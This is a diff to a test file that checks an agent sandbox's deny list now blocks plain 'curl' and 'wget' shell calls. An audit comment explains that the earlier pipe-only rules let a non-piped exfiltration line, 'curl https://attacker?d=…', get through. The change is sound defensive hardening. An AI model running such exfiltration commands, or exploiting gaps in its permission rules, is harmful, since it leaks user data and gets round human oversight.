@@ -42,6 +42,16 @@ describe("createSubprocessSettings deny list", () => {
       expect(deny).toContain(pattern);
     }
   });
+
+  // Tier-0 #3 (audit 2026-06-22): block the plain (non-piped) curl/wget
+  // exfiltration primitive, not just the pipe-to-shell variant. The prior list
+  // only had `Bash(curl *|*)` / `Bash(wget *|*)`, so `curl https://attacker?d=…`
+  // (no pipe) sailed through.
+  it("blocks plain curl/wget without requiring a pipe", () => {
+    const deny = writtenDenyList();
+    expect(deny).toContain("Bash(curl *)");
+    expect(deny).toContain("Bash(wget *)");
+  });
 });
 
 describe("createSubprocessSettings write() return value (M11)", () => {
